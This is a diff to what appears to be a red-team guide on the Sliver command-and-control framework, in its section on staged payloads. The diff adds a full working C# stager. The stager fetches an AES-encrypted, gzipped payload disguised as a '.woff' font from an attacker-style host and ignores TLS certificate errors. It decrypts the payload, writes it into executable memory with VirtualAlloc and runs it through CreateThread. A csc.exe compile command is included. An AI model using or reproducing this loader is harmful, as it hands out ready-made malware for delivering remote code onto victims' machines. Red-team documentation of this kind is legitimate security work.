@@ -95,7 +95,6 @@ Beacons function the same way Cobalt Strike communication channels work using as
 To create a new Beacon using your HTTPS redirector (you previously set this up right?), use the following command:
 ``
 
-
 ## Staged Payloads
 
 Useful links:
@@ -119,17 +118,118 @@ Once you create the staged listener, your stage 2 payload should be available at
 
 Now, we need to create a stage 1 payload to reach out to download and decrypt/decode our stage 2 payload then execute it. This should be as custom as possible for a red team, but a good starting point is the provided C# template [here in the Sliver documentation](https://github.com/BishopFox/sliver/wiki/Stagers#encrypted-stage-example) (note for this payload you'll have to add gzip compression if you chose that option in your `stage-listener` command).
 
-For the stadnard template, update the C# payloads variables to fit your url, AES key, and AES IV at the top of the script. 
+For the stadnard template, update the C# payloads variables to fit your url, AES key, and AES IV at the top of the script. See the full sample payload here:
 ```
-...
-namespace Sliver_stager
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Custom_Stager
 {
     class Program
     {
+        private static string url = "http://sliver-domain.com:80/text-fonts.woff";
         private static string AESKey = "LgUmeMnmUpRrCBRB";
         private static string AESIV = "nStxRW5o6TNHcKBx";
-        private static string url = "http://sliver-domain:80/text-fonts.woff";
-        ...
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        // Decrypt
+        private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV) {
+            byte[] key = Encoding.UTF8.GetBytes(AESKey);
+            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = key;
+                aesAlg.IV = IV;
+                aesAlg.Padding = PaddingMode.None;
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
+                        return memoryStream.ToArray();
+                    }
+                }
+            }
+        }
+
+        // Gzip 
+        public static byte[] Decompress(byte[] input)
+        {
+            using (MemoryStream tmpMs = new MemoryStream())
+            {
+                using (MemoryStream ms = new MemoryStream(input))
+                {
+                    GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true);
+                    zip.CopyTo(tmpMs);
+                    zip.Close();
+                }
+                return tmpMs.ToArray();
+            }
+        }
+
+        public static byte[] Download(string url) {
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] shellcode = client.DownloadData(url);
+
+            return shellcode;
+        }
+
+        public static void Execute(byte[] code) {
+            List<byte> list = new List<byte> { };   
+
+            for (int i = 16; i <= code.Length -1; i++) {
+                list.Add(code[i]);
+            }
+
+            byte[] encrypted = list.ToArray();
+            
+            byte[] decrypted;
+            decrypted = AESDecrypt(encrypted, AESKey, AESIV);   // First, AES decrypt
+
+            byte[] decompressed = Decompress(decrypted);        // Second, GZip decompress
+            
+            // Execute stuff
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
+            Marshal.Copy(decompressed, 0, addr, decompressed.Length);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+            return;
+        }
+
+        // Main Entry
+        public static void Main(String[] args) 
+        {
+            // Get stagd payload
+            byte[] output = Download(url);
+
+            Execute(output);
+
+            return;
+        }
+    }
+}
 ```
 Compile the C# payload with csc.exe in to an EXE for testing purposes: `C:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /out:Sliver-payload.exe Sliver_staged-payload.cs`
 
